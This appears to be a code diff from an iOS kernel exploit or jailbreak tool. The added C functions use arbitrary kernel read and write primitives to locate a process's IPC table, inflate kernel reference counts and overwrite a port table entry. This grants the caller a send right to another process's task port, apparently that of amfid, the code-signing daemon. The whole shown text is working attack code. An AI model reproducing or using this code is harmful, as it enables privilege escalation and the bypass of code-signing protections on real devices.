@@ -90,3 +90,46 @@ mach_port_t fake_host_priv() {
   return port;
 }
 
+uint64_t get_proc_ipc_table(uint64_t proc) {
+    uint64_t task_t = ReadAnywhere64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
+    LOG("task_t: 0x%llx\n", task_t);
+    
+    uint64_t itk_space = ReadAnywhere64(task_t + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+    LOG("itk_space: 0x%llx\n", itk_space);
+    
+    uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+    LOG("is_table: 0x%llx\n", is_table);
+    
+    return is_table;
+}
+
+/* give ourselves a send right to this proc's task port */
+mach_port_t proc_to_task_port(uint64_t proc, uint64_t our_proc) {
+    // allocate a new raw mach port:
+    mach_port_t p = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+    
+    uint64_t ports = get_proc_ipc_table(proc);
+    
+    // get the task port:
+    uint64_t task_port = ReadAnywhere64(ports + 0x18); // first port's ie_object
+    // leak some refs:
+    WriteAnywhere32(task_port+4, 0x383838);
+    
+    uint64_t task_t = ReadAnywhere64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
+    // leak some refs
+    WriteAnywhere32(task_t + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT), 0x393939);
+    
+    // get the address of the ipc_port of our newly allocate port
+    uint64_t ipc_table = get_proc_ipc_table(our_proc);
+    // point the port's ie_object to amfid's task port:
+    WriteAnywhere64(ipc_table + ((p >> 8) * 0x18), task_port);
+    
+    // remove our receive right:
+    uint32_t ie_bits = ReadAnywhere32(ipc_table + ((p >> 8) * 0x18) + 8);
+    ie_bits &= ~(1<<17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECEIVE)
+    WriteAnywhere32(ipc_table + ((p >> 8) * 0x18) + 8, ie_bits);
+    
+    return p;
+}
